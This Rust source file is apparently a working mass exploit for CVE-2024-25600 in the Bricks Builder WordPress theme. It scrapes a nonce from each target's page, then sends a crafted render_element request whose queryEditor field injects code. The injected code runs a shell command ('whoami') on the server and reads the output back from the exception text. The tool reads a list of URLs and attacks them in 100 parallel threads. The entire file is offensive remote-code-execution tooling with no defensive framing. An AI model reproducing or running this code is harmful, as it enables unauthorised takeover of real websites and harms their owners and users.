use std::fs::File;
use std::io::{self, BufRead, Write};
use std::sync::{Arc, Mutex};
use threadpool::ThreadPool;
use reqwest::blocking::Client;
use scraper::{Html, Selector};
use regex::Regex;

fn fetch_nonce(url: &str) -> Option<String> {
    let client = Client::new();
    let res = client.get(url).send().ok()?;
    let body = res.text().ok()?;
    let document = Html::parse_document(&body);
    let selector = Selector::parse("script#bricks-scripts-js-extra").ok()?;
    let script_tag = document.select(&selector).next()?;
    let text = script_tag.text().collect::<String>();
    let re = Regex::new(r#""nonce":"([a-f0-9]+)""#).ok()?;
    let captures = re.captures(&text)?;
    let nonce = captures.get(1)?.as_str().to_string();
    Some(nonce)
}

fn send_request(url: &str, nonce: &str, post_id: &str, command: &str) -> Option<String> {
    let client = Client::new();
    let json_data = serde_json::json!({
        "postId": post_id,
        "nonce": nonce,
        "element": {
            "name": "carousel",
            "settings": {
                "type": "posts",
                "query": {
                    "useQueryEditor": true,
                    "queryEditor": format!("throw new Exception(`{}`);", command),
                    "objectType": "post"
                }
            }
        }
    });

    let res = client
        .post(&format!("{}/wp-json/bricks/v1/render_element", url))
        .json(&json_data)
        .send()
        .ok()?;
    let body = res.text().ok()?;
    Some(body)
}

fn process_response(body: &str) -> Option<String> {
    let re = Regex::new(r#"Exception: (.*)$"#).ok()?;
    let captures = re.captures(body)?;
    let exception_text = captures.get(1)?.as_str().trim().to_string();
    Some(exception_text)
}

fn check_vulnerability(url: &str) -> Option<String> {
    let nonce = fetch_nonce(url)?;
    let response_body = send_request(url, &nonce, "1", "whoami")?;
    let extracted_text = process_response(&response_body)?;
    Some(format!("{} is vulnerable to CVE-2024-25600, {}", url, extracted_text))
}

fn main() -> io::Result<()> {
    let args: Vec<String> = std::env::args().collect();
    if args.len() != 2 {
        eprintln!("Usage: {} <filename>", args[0]);
        std::process::exit(1);
    }

    let filename = &args[1];
    let file = File::open(filename)?;
    let reader = io::BufReader::new(file);
    let pool = ThreadPool::new(100);
    let shared_output = Arc::new(Mutex::new(io::stdout()));

    for line in reader.lines() {
        let shared_output = Arc::clone(&shared_output);
        let url = match line {
            Ok(url) => url,
            Err(err) => {
                eprintln!("Error reading line: {}", err);
                continue;
            }
        };

        pool.execute(move || {
            if let Some(result) = check_vulnerability(&url) {
                let mut output = shared_output.lock().unwrap();
                writeln!(&mut *output, "{}", result).unwrap_or_else(|err| {
                    eprintln!("Error writing to output: {}", err);
                });
            }
        });
    }

    pool.join();

    Ok(())
}
